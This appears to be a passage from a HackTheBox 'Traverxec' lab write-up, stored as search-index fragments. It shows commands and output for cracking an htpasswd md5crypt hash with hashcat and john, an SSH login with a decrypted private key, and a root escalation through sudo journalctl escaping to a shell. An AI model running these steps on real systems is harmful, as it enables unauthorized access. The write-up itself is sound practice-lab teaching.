───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ❯ hashcat --example-hashes | grep '\\$1\\$' -B 2 MODE: 500 TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/ -- MODE: 12200 TYPE: eCryptfs HASH: $ecryptfs$0$1$4207883745556753$567daa975114206c -- MODE: 16700 TYPE: FileVault 2 HASH: $fvde$1$16$84286044060108438487434858307513$20000$f1620ab93192112f0a23eea89b5d4df065661f974b704191 -- MODE: 22100 TYPE: BitLocker HASH: $bitlocker$1$16$6f972989ddc209f1eccf07313a7266a2$1048576$12$3a33a8eaff5e6f81d907b591$60$316b0f6d4cb445fb056f0e3e0633c413526ff4481bbf588917b70a4e8f8075f5ceb45958a800b42cb7ff9b7f5e1 7c6145bf8561ea86f52d3592059fb Now that we know the module, we can attempt to crack the hash: ❯ find / -name 'hashcat.potfile' 2\u003e/dev/null /home/wixnic/.hashcat/hashcat.potfile ❯ echo '' \u003e ~/.hashcat/hashcat.potfile ❯ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --username --force ...\u003cSNIP\u003e... $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me ...\u003cSNIP\u003e... You can also use john, but let me empty my pot file first: ❯ find / -name 'john.pot' 2\u003e/dev/null /home/wixnic/.john/john.pot ❯ echo '' \u003e ~/.john/john.pot Now we can use john: ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status Nowonly4me (david) 1g 0:00:00:22 DONE (2021-10-17 18:47) 0.04411g/s 466626p/s 466626c/s 466626C/s Noyoudo..Nous4=5 Use the \"--show\" option to display all of the cracked passwords reliably Session completed Looking at the nostromo configuration file nhttpd.conf: www-data@traverxec:$ cd /var/nostromo/conf www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf cat nhttpd.conf # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www We can see that this file has some home directories and one of them is public which points to public_www and the server admin is david. If we read the man page of nostromo, we can see the HOMEDIRS section (read this): HOMEDIRS To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example: http://www.nazgul.ch/~hacki/ The content of the home directory is handled exactly the same way as a directory in your document root. If some users don't want that their home directory can be accessed via HTTP, they shall remove the world readable flag","date":"2021-10-22","objectID":"/htb_traverxec/:8:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell over SSH Now that we have the decrypted private key, we can use it to authenticate to the SSH service as the user david: ❯ ssh -i id_rsa_david david@10.10.10.165 The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established. ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts. Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 david@traverxec:~$ id uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) david@traverxec:~$ cut -c-5 user.txt 7db0b Privilege Escalation: david -\u003e root ","date":"2021-10-22","objectID":"/htb_traverxec/:9:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Enumeration We can start by enumerating the home folder of the current user: david@traverxec:~$ ls -lahR \u003c...snip...\u003e david@traverxec:~$ cat bin/server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo \"Load: `/usr/bin/uptime`\" echo \" \" echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\" echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\" echo \" \" echo \"Last 5 journal log lines:\" /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat There’s a script which runs sudo on the program journalctl. ","date":"2021-10-22","objectID":"/htb_traverxec/:10:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Exploiting journalctl If we look up journalctrl on gtfobins (read gtfobins), and there is a sudo option. It’s quite short and simply saying: sudo journalctl !/bin/sh The journalctrl will output to stdout if it the amount of vertical lines can fit onto the current page, otherwise it will go into less if it can’t. We can try this on our localhost: sudo journalctl You will see that we are now in less: sep 09 20:49:55 parrot kernel: MTRR default type: uncachable sep 09 20:49:55 parrot kernel: MTRR fixed ranges enabled: sep 09 20:49:55 parrot kernel: 00000-9FFFF write-back lines 1-39 In the journalctl command we can see the parameter -n which takes 5 lines as the argument this means that only five lines will be sent to the output, so we need to shrink the terminal to something smaller than 5 lines, and we’ll get sent into less as root. Lets try this on our host first, to see how it works: sudo journalctl -n 5 Let’s not forget to resize the terminal (vertically). Knowing this, we can try to attempt to escalate privileges with command shown in GTFOBins: david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service -- Logs begin at Sun 2021-10-17 18:09:21 EDT, end at Sun 2021-10-17 19:25:33 EDT. -- Oct 17 18:34:04 traverxec sudo[3841]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost= user=www-data Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): conversation failed Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): auth could not identify password for [www-data] !/bin/bash root@traverxec:/home/david# id uid=0(root) gid=0(root) groups=0(root) root@traverxec:/home/david# cd /root root@traverxec:~# ls nostromo_1.9.6-1.deb root.txt root@traverxec:~# cut -c-5 root.txt 9aa36 Alternatively, we can just setup the stty rows to have less than 5 rows (vertical lines): david@traverxec:~$ stty rows 1 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service !/bin/bash root@traverxec:/home/david# id uid=0(root) gid=0(root) groups=0(root) root@traverxec:/home/david# ","date":"2021-10-22","objectID":"/htb_traverxec/:11:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"}]